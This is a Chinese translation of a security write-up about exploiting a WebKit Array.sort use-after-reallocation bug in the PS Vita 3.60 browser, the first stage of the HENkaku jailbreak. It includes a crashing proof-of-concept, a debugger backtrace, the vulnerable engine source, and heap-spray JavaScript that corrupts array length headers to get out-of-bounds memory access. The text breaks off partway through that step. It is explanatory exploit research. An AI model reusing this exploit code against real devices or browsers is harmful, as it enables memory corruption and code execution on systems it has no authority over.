<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>Exploiting WebKit on Vita 3.60</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">Exploiting WebKit on Vita 3.60</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2016-11-03" class="timeago">10 月，2 周 之前</time>
          <time datetime="2016-11-03" class="fulldate">十一月 03, 2016</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/bin-security/">二进制安全</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p>来源：<a href="https://blog.xyz.is/2016/webkit-360.html">Exploiting WebKit on Vita 3.60</a></p>
<p>原作者：<a href="https://github.com/xyzz">xyzz </a></p>
<p>译：<strong>Holic (知道创宇404安全实验室)</strong></p>
<p><strong>译者注</strong>：浏览器作为用户交互较多的应用，漏洞利用点相对多一些，而系统浏览器通常以高权限运行，对封闭的终端设备来说，这就提供了不错的漏洞利用条件。本篇 PSV 的 Writeup 介绍了一个 Webkit 漏洞的利用思路，同理我们可以将思路发散到其他终端设备上，比如之前的 <a href="https://cturt.github.io/ps4.html">PS4 1.76版本 Webkit 堆溢出漏洞</a>，<a href="https://github.com/sgayou/kindle-5.6.5-jailbreak/blob/master/doc/README.md">Kindle 的越狱</a> 等...</p>
<h3>简介</h3>
<p>这是 <a href="https://henkaku.xyz/">HENkaku</a> 攻击链系列 Writeup 的开始章节。我会尽量不对 <a href="https://yifan.lu/2016/08/05/henkaku-koth-challenge">KOTH challenge</a> 进行太多破坏，仅仅记录逆向工程的部分，以阐明大家所错过的细节。然而，在这种情况下，挑战无人问津且毫无进展。不管怎样，我将会发布 writeup，既然我已经写了，让它烂在我的repo里面会是一种浪费。</p>
<h3>The PoC</h3>
<p>我们选择的能在用户模式执行代码的目标便是 WebKit。Webkit 拥有 JavaScript 引擎，当我们需要绕过 ASLR 时，它对我们很有用。PS Vita 上的 Web 浏览器也不需要登录 PSN，不会自动更新，允许实现非常简单的攻击利用链（访问网站按下按钮）。完美。</p>
<p>和没有 ASLR 的 3DS 不同，Vita WebKit 有一个可接受的熵值为9 bits 的 ASLR，这就使暴力破解攻击变得非常痛苦（平均需要重新加载 512 次来触发漏洞，好怕！）。因此，我们需要一个比通用 UAF（释放后重用） + vptr（虚函数表指针） 覆写更好的漏洞。</p>
<p>感谢某些人，我设法得到了一个漂亮的 PoC 脚本，可以在最新的固件上造成 Vita 的浏览器崩溃。它不存在于 WebKit bugzilla/repo 的任何地方（或许在限制部分）。</p>
<p>那么作为开始的便是此脚本：</p>
<div class="codehilite"><pre><span></span><span class="kd">var</span> <span class="nx">almost_oversize</span> <span class="o">=</span> <span class="mh">0x3000</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">foo</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">almost_oversize</span><span class="p">));</span>
<span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="p">{};</span>
<span class="nx">o</span><span class="p">.</span><span class="nx">toString</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span> <span class="nx">foo</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="mi">12345</span><span class="p">);</span> <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="nx">foo</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="nx">foo</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nx">foo</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">o</span><span class="p">;</span>
<span class="nx">foo</span><span class="p">.</span><span class="nx">sort</span><span class="p">();</span>
</pre></div>


<p>如果你在使用 Sony 的 Webkit 的 Linux 主机上运行它，你将看到发生段错误。让我们在调试器里面看看：</p>
<div class="codehilite"><pre><span></span><span class="n">Thread</span> <span class="mi">1</span> <span class="s">&quot;GtkLauncher&quot;</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
<span class="mh">0x00007ffff30bec35</span> <span class="k">in</span> <span class="n">JSC</span><span class="o">::</span><span class="n">WriteBarrierBase</span><span class="o">&lt;</span><span class="n">JSC</span><span class="o">::</span><span class="n">Unknown</span><span class="o">&gt;::</span><span class="n">set</span> <span class="p">(</span><span class="n">this</span><span class="o">=</span><span class="mh">0x7fff98ef8048</span><span class="p">,</span> <span class="n">owner</span><span class="o">=</span><span class="mh">0x7fff9911ff60</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="p">...)</span> <span class="n">at</span> <span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">Source</span><span class="o">/</span><span class="n">JavaScriptCore</span><span class="o">/</span><span class="n">runtime</span><span class="o">/</span><span class="n">WriteBarrier</span><span class="p">.</span><span class="nl">h</span><span class="p">:</span><span class="mi">152</span>
<span class="mi">152</span>         <span class="n">m_value</span> <span class="o">=</span> <span class="bp">JSValue</span><span class="o">::</span><span class="n">encode</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">bt</span>
<span class="cp">#0  0x00007ffff30bec35 in JSC::WriteBarrierBase&lt;JSC::Unknown&gt;::set (this=0x7fff98ef8048, owner=0x7fff9911ff60, value=...) at ../../Source/JavaScriptCore/runtime/WriteBarrier.h:152</span>
<span class="cp">#1  0x00007ffff32cb9bf in JSC::ContiguousTypeAccessor&lt;(unsigned char)27&gt;::setWithValue (vm=..., thisValue=0x7fff9911ff60, data=..., i=0, value=...) at ../../Source/JavaScriptCore/runtime/JSArray.cpp:1069</span>
<span class="cp">#2  0x00007ffff32c8809 in JSC::JSArray::sortCompactedVector&lt;(unsigned char)27, JSC::WriteBarrier&lt;JSC::Unknown&gt; &gt; (this=0x7fff9911ff60, exec=0x7fff9d6e8078, data=..., relevantLength=3)</span>
    <span class="n">at</span> <span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">Source</span><span class="o">/</span><span class="n">JavaScriptCore</span><span class="o">/</span><span class="n">runtime</span><span class="o">/</span><span class="n">JSArray</span><span class="p">.</span><span class="nl">cpp</span><span class="p">:</span><span class="mi">1171</span>
<span class="cp">#3  0x00007ffff32c4933 in JSC::JSArray::sort (this=0x7fff9911ff60, exec=0x7fff9d6e8078) at ../../Source/JavaScriptCore/runtime/JSArray.cpp:1214</span>
<span class="cp">#4  0x00007ffff329c844 in JSC::attemptFastSort (exec=0x7fff9d6e8078, thisObj=0x7fff9911ff60, function=..., callData=..., callType=@0x7fffffffbfb4: JSC::CallTypeNone)</span>
    <span class="n">at</span> <span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">Source</span><span class="o">/</span><span class="n">JavaScriptCore</span><span class="o">/</span><span class="n">runtime</span><span class="o">/</span><span class="n">ArrayPrototype</span><span class="p">.</span><span class="nl">cpp</span><span class="p">:</span><span class="mi">623</span>
<span class="cp">#5  0x00007ffff329db4c in JSC::arrayProtoFuncSort (exec=0x7fff9d6e8078) at ../../Source/JavaScriptCore/runtime/ArrayPrototype.cpp:697</span>

<span class="o">&lt;</span><span class="n">the</span> <span class="n">rest</span> <span class="n">does</span> <span class="n">not</span> <span class="n">matter</span><span class="o">&gt;</span>
</pre></div>


<p>原来她在执行 Javascript Array.sort 函数的时候会遇到未映射的内存。但是这到底发生了什么？</p>
<h3>The bug</h3>
<p>让我们看看 <code>JSArray::sort</code> 方法（<code>Source/JavaScriptCore/runtime/JSArray.cpp</code>)。因为我们的数组是 <code>ArrayWithContiguous</code>类型是由它如何创建决定的:<code>Array.prototype.constructor.apply(null, new Array(almost_oversize));</code>，我们进入<code>sortCompactedVector</code> 函数。这是它的完整定义：</p>
<div class="codehilite"><pre><span></span><span class="n">template</span><span class="o">&lt;</span><span class="n">IndexingType</span> <span class="n">indexingType</span><span class="p">,</span> <span class="kr">typename</span> <span class="n">StorageType</span><span class="o">&gt;</span>
<span class="kt">void</span> <span class="n">JSArray</span><span class="o">::</span><span class="n">sortCompactedVector</span><span class="p">(</span><span class="n">ExecState</span><span class="o">*</span> <span class="n">exec</span><span class="p">,</span> <span class="n">ContiguousData</span><span class="o">&lt;</span><span class="n">StorageType</span><span class="o">&gt;</span> <span class="n">data</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">relevantLength</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">relevantLength</span><span class="p">)</span>
        <span class="k">return</span><span class="p">;</span>

    <span class="n">VM</span><span class="o">&amp;</span> <span class="n">vm</span> <span class="o">=</span> <span class="n">exec</span><span class="o">-&gt;</span><span class="n">vm</span><span class="p">();</span>

    <span class="c1">// Converting JavaScript values to strings can be expensive, so we do it once up front and sort based on that.</span>
    <span class="c1">// This is a considerable improvement over doing it twice per comparison, though it requires a large temporary</span>
    <span class="c1">// buffer. Besides, this protects us from crashing if some objects have custom toString methods that return</span>
    <span class="c1">// random or otherwise changing results, effectively making compare function inconsistent.</span>

    <span class="n">Vector</span><span class="o">&lt;</span><span class="n">ValueStringPair</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">UnsafeVectorOverflow</span><span class="o">&gt;</span> <span class="n">values</span><span class="p">(</span><span class="n">relevantLength</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">values</span><span class="p">.</span><span class="n">begin</span><span class="p">())</span> <span class="p">{</span>
        <span class="n">throwOutOfMemoryError</span><span class="p">(</span><span class="n">exec</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">Heap</span><span class="o">::</span><span class="n">heap</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">pushTempSortVector</span><span class="p">(</span><span class="o">&amp;</span><span class="n">values</span><span class="p">);</span>

    <span class="kt">bool</span> <span class="n">isSortingPrimitiveValues</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">relevantLength</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">JSValue</span> <span class="n">value</span> <span class="o">=</span> <span class="n">ContiguousTypeAccessor</span><span class="o">&lt;</span><span class="n">indexingType</span><span class="o">&gt;::</span><span class="n">getAsValue</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
        <span class="n">ASSERT</span><span class="p">(</span><span class="n">indexingType</span> <span class="o">!=</span> <span class="n">ArrayWithInt32</span> <span class="o">||</span> <span class="n">value</span><span class="p">.</span><span class="n">isInt32</span><span class="p">());</span>
        <span class="n">ASSERT</span><span class="p">(</span><span class="o">!</span><span class="n">value</span><span class="p">.</span><span class="n">isUndefined</span><span class="p">());</span>
        <span class="n">values</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">first</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">indexingType</span> <span class="o">!=</span> <span class="n">ArrayWithDouble</span> <span class="o">&amp;&amp;</span> <span class="n">indexingType</span> <span class="o">!=</span> <span class="n">ArrayWithInt32</span><span class="p">)</span>
            <span class="n">isSortingPrimitiveValues</span> <span class="o">=</span> <span class="n">isSortingPrimitiveValues</span> <span class="o">&amp;&amp;</span> <span class="n">value</span><span class="p">.</span><span class="n">isPrimitive</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="c1">// FIXME: The following loop continues to call toString on subsequent values even after</span>
    <span class="c1">// a toString call raises an exception.</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">relevantLength</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">values</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">second</span> <span class="o">=</span> <span class="n">values</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">first</span><span class="p">.</span><span class="n">toWTFStringInline</span><span class="p">(</span><span class="n">exec</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">exec</span><span class="o">-&gt;</span><span class="n">hadException</span><span class="p">())</span> <span class="p">{</span>
        <span class="n">Heap</span><span class="o">::</span><span class="n">heap</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">popTempSortVector</span><span class="p">(</span><span class="o">&amp;</span><span class="n">values</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// FIXME: Since we sort by string value, a fast algorithm might be to use a radix sort. That would be O(N) rather</span>
    <span class="c1">// than O(N log N).</span>

<span class="cp">#if HAVE(MERGESORT)</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">isSortingPrimitiveValues</span><span class="p">)</span>
        <span class="n">qsort</span><span class="p">(</span><span class="n">values</span><span class="p">.</span><span class="n">begin</span><span class="p">(),</span> <span class="n">values</span><span class="p">.</span><span class="n">size</span><span class="p">(),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ValueStringPair</span><span class="p">),</span> <span class="n">compareByStringPairForQSort</span><span class="p">);</span>
    <span class="k">else</span>
        <span class="nf">mergesort</span><span class="p">(</span><span class="n">values</span><span class="p">.</span><span class="n">begin</span><span class="p">(),</span> <span class="n">values</span><span class="p">.</span><span class="n">size</span><span class="p">(),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ValueStringPair</span><span class="p">),</span> <span class="n">compareByStringPairForQSort</span><span class="p">);</span>
<span class="cp">#else</span>
    <span class="c1">// FIXME: The qsort library function is likely to not be a stable sort.</span>
    <span class="c1">// ECMAScript-262 does not specify a stable sort, but in practice, browsers perform a stable sort.</span>
    <span class="n">qsort</span><span class="p">(</span><span class="n">values</span><span class="p">.</span><span class="n">begin</span><span class="p">(),</span> <span class="n">values</span><span class="p">.</span><span class="n">size</span><span class="p">(),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ValueStringPair</span><span class="p">),</span> <span class="n">compareByStringPairForQSort</span><span class="p">);</span>
<span class="cp">#endif</span>

    <span class="c1">// If the toString function changed the length of the array or vector storage,</span>
    <span class="c1">// increase the length to handle the orignal number of actual values.</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">indexingType</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="nl">ArrayWithInt32</span><span class="p">:</span>
    <span class="k">case</span> <span class="nl">ArrayWithDouble</span><span class="p">:</span>
    <span class="k">case</span> <span class="nl">ArrayWithContiguous</span><span class="p">:</span>
        <span class="n">ensureLength</span><span class="p">(</span><span class="n">vm</span><span class="p">,</span> <span class="n">relevantLength</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>

    <span class="k">case</span> <span class="nl">ArrayWithArrayStorage</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">arrayStorage</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">vectorLength</span><span class="p">()</span> <span class="o">&lt;</span> <span class="n">relevantLength</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">increaseVectorLength</span><span class="p">(</span><span class="n">exec</span><span class="o">-&gt;</span><span class="n">vm</span><span class="p">(),</span> <span class="n">relevantLength</span><span class="p">);</span>
            <span class="n">ContiguousTypeAccessor</span><span class="o">&lt;</span><span class="n">indexingType</span><span class="o">&gt;::</span><span class="n">replaceDataReference</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="n">arrayStorage</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">vector</span><span class="p">());</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">arrayStorage</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">()</span> <span class="o">&lt;</span> <span class="n">relevantLength</span><span class="p">)</span>
            <span class="n">arrayStorage</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">setLength</span><span class="p">(</span><span class="n">relevantLength</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>

    <span class="k">default</span><span class="o">:</span>
        <span class="n">CRASH</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">relevantLength</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">ContiguousTypeAccessor</span><span class="o">&lt;</span><span class="n">indexingType</span><span class="o">&gt;::</span><span class="n">setWithValue</span><span class="p">(</span><span class="n">vm</span><span class="p">,</span> <span class="n">this</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">values</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">first</span><span class="p">);</span>

    <span class="n">Heap</span><span class="o">::</span><span class="n">heap</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">popTempSortVector</span><span class="p">(</span><span class="o">&amp;</span><span class="n">values</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>


<p>此函数从 JS 数组中取值，将它们放入一个临时向量中，对向量进行排序，然后将值放回 JS 数组。</p>
<p>在第 37 行，<code>for</code> 循环中，对于每一个元素，它的<code>toString</code>方法被调。当它被我们的对象 <code>o</code> 调用时，便是接下来发生的：</p>
<div class="codehilite"><pre><span></span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nx">foo</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="mi">12345</span><span class="p">);</span>
    <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>一个整数被 push 进正在排序的数组。这导致了数组元素被重新分配。在81行，被排序的元素被写回数组，然而，<code>data</code>指针<strong>从不用新分配的值进行更新</strong>。</p>
<p>图例说明：
<img alt="" src="https://blog.xyz.is/assets/wk360-after-push.svg" /></p>
<p>灰色的区域是空闲/未分配的内存。在 Linux 上，实际是在调用 realloc 后取消映射。同时，<code>data</code>仍然指向旧的内存区域。因此，Web 浏览器试图向未映射的内存写入，产生段错误。</p>
<h3>Out-of-bounds RW</h3>
<p>越界读写</p>
<p>根据内容，<code>JSArray</code> 对象可能在内存中以不同的方式存储。然而，我们正在操作的，是作为元数据头(<strong>metadata header</strong>)（黄色部分）加上数组内容（绿色部分）连续存储的。</p>
<p>内容只是一个<code>JSValue</code>结构的向量。</p>
<div class="codehilite"><pre><span></span><span class="k">union</span> <span class="n">EncodedValueDescriptor</span> <span class="p">{</span>
    <span class="kt">int64_t</span> <span class="n">asInt64</span><span class="p">;</span>
    <span class="kt">double</span> <span class="n">asDouble</span><span class="p">;</span>
    <span class="k">struct</span> <span class="p">{</span>
        <span class="kt">int32_t</span> <span class="n">payload</span><span class="p">;</span>
        <span class="kt">int32_t</span> <span class="n">tag</span><span class="p">;</span>
    <span class="p">}</span> <span class="n">asBits</span><span class="p">;</span>
<span class="p">};</span>
</pre></div>


<p>The metadata header stores two interesting fields:</p>
<div class="codehilite"><pre><span></span><span class="kt">uint32_t</span> <span class="n">m_publicLength</span><span class="p">;</span> <span class="c1">// The meaning of this field depends on the array type, but for all JSArrays we rely on this being the publicly visible length (array.length).</span>
<span class="kt">uint32_t</span> <span class="n">m_vectorLength</span><span class="p">;</span> <span class="c1">// The length of the indexed property storage. The actual size of the storage depends on this, and the type.</span>
</pre></div>


<p>我们的目标是覆盖它们，并将数组“扩展”超出实际分配的范围。</p>
<p>为了实现这一点，我们来修改<code>o.toString</code>方法：</p>
<div class="codehilite"><pre><span></span><span class="n">var</span> <span class="n">normal_length</span> <span class="o">=</span> <span class="mh">0x800</span><span class="p">;</span>
<span class="n">var</span> <span class="n">fu</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Array</span><span class="p">(</span><span class="n">normal_length</span><span class="p">);</span>
<span class="n">var</span> <span class="n">arrays</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Array</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
<span class="n">o</span><span class="p">.</span><span class="n">toString</span> <span class="o">=</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="n">foo</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">12345</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">var</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">arrays</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">var</span> <span class="n">bar</span> <span class="o">=</span> <span class="n">Array</span><span class="p">.</span><span class="n">prototype</span><span class="p">.</span><span class="n">constructor</span><span class="p">.</span><span class="n">apply</span><span class="p">(</span><span class="n">null</span><span class="p">,</span> <span class="n">fu</span><span class="p">);</span>
        <span class="n">bar</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">bar</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="n">bar</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
        <span class="n">arrays</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">bar</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="s">&quot;&quot;</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>如果我们运气好的话，这便是所发生的：
<img alt="" src="https://blog.xyz.is/assets/wk360-after-push-and-spray.svg" /></p>
<p>在此例中（不反映真实数组大小），当使用<code>data</code>指针写回排序值的时候，第二条和第三条 <code>bar</code>的 metadata headers 将被覆盖。</p>
<p>我们用什么覆盖它们？记住，绿色的区域是 <code>JSValue</code> 对象的向量。每一个 <code>JSValue</code>对象都是 8 字节的。但是，如果我们使用比如 <code>0x8000000</code> 的数据填充 <code>foo</code> ，我们只能控制 4 字节，其余的是用于<code>tag</code> 的。<code>tag</code> 是什么？</p>
<div class="codehilite"><pre><span></span><span class="k">enum</span> <span class="p">{</span> <span class="n">Int32Tag</span> <span class="o">=</span>        <span class="mh">0xffffffff</span> <span class="p">};</span>
<span class="k">enum</span> <span class="p">{</span> <span class="n">BooleanTag</span> <span class="o">=</span>      <span class="mh">0xfffffffe</span> <span class="p">};</span>
<span class="k">enum</span> <span class="p">{</span> <span class="n">NullTag</span> <span class="o">=</span>         <span class="mh">0xfffffffd</span> <span class="p">};</span>
<span class="k">enum</span> <span class="p">{</span> <span class="n">UndefinedTag</span> <span class="o">=</span>    <span class="mh">0xfffffffc</span> <span class="p">};</span>
<span class="k">enum</span> <span class="p">{</span> <span class="n">CellTag</span> <span class="o">=</span>         <span class="mh">0xfffffffb</span> <span class="p">};</span>
<span class="k">enum</span> <span class="p">{</span> <span class="n">EmptyValueTag</span> <span class="o">=</span>   <span class="mh">0xfffffffa</span> <span class="p">};</span>
<span class="k">enum</span> <span class="p">{</span> <span class="n">DeletedValueTag</span> <span class="o">=</span> <span class="mh">0xfffffff9</span> <span class="p">};</span>

<span class="k">enum</span> <span class="p">{</span> <span class="n">LowestTag</span> <span class="o">=</span>  <span class="n">DeletedValueTag</span> <span class="p">};</span>
</pre></div>


<p>这就是 Webkit JavaScriptCore 如何将不同的类型打包成单个JSValue 结构的：它可以是int，boolean，cell（指向一个对象的指针），null，undefined 或者 double 类型。因此如果我们 写入<code>54321</code>，我们只能控制一半的结构，而另一半被设置成 <code>Int32Tag</code> 或者 <code>0xffffffff</code>。</p>
<p>但是，我们也可以写入<code>double</code>类型的值，比如<code>54321.0</code>。我们用这种方法控制所有 8 字节，但是还有其他限制（一些浮点指针规范化并不允许写入真正的任意值。否则，你将能够制作<code>CellTag</code>并将指针设置成任意值，这是很可怕的。有趣的是，在它确实允许之前，这是第一个<a href="https://www.lolhax.org/2014/10/28/psvita-webkit-for-2-00/">Vita WebKit exploit</a>使用过的！CVE-2010-1807）。</p>
<p>因此，我们还是写入 <code>double</code> 类型的值吧。</p>
<div class="codehilite"><pre><span></span><span class="n">foo</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">o</span><span class="p">;</span>
<span class="n">var</span> <span class="n">len</span> <span class="o">=</span> <span class="n">u2d</span><span class="p">(</span><span class="mh">0x80000000</span><span class="p">,</span> <span class="mh">0x80000000</span><span class="p">);</span>
